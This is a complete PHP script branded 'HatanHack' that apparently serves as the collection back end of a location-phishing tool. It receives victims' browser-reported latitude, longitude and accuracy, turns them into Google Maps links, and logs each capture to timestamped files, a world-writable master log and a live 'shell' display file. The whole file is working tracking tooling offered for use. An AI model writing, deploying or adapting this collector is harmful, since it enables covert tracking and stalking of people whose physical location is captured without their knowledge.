<?php
// HatanHack Location Processing Script
$date = date('dMYHis');
$latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
$longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
$accuracy = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';

if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
    // Create HatanHack marker file
    file_put_contents("hatan_location_marker.log", "Location captured\n", FILE_APPEND);
    
    // The Google Maps link structure
    $google_maps_link = "https://www.google.com/maps/search/?api=1&query=" . $latitude . "," . $longitude;

    $data = "Latitude: " . $latitude . "\r\n" .
            "Longitude: " . $longitude . "\r\n" .
            "Accuracy: " . $accuracy . " meters\r\n" .
            "Google Maps: " . $google_maps_link . "\r\n" .
            "Date: " . $date . "\r\n";
    
    // Create a unique filename with timestamp (e.g., location_25OCT2025170000.txt)
    $file = 'hatan_location_' . $date . '.txt';
    
    try {
        // 1. Create the unique log file
        $fp = fopen($file, 'w');
        if ($fp) {
            fwrite($fp, $data);
            fclose($fp);
            
            // 2. Create the console file for real-time display in the shell
            $console_log = fopen("hatan_current_location.txt", "w");
            fwrite($console_log, $data);
            fclose($console_log);
            
            // 3. Append to a master location file
            $masterFile = 'hatan_saved_locations.txt';
            
            // Create the master file if it doesn't exist
            if (!file_exists($masterFile)) {
                touch($masterFile);
                chmod($masterFile, 0666); 
            }
            
            $fp = fopen($masterFile, 'a');
            if ($fp) {
                fwrite($fp, "\n=== HatanHack Location Captured ===\n" . $data . "\n");
                fclose($fp);
            }
            
            // 4. Create the saved_locations directory if it doesn't exist
            if (!is_dir('hatan_saved_locations')) {
                mkdir('hatan_saved_locations', 0755, true);
            }
            
            // 5. Copy the location file to the saved_locations directory
            copy($file, 'hatan_saved_locations/' . $file);
            
            // Return success response
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success', 'message' => 'Location data received by HatanHack']);
        } else {
            throw new Exception("Could not open file for writing");
        }
    } catch (Exception $e) {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Could not save location data']);
    }
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
}

exit();
?>
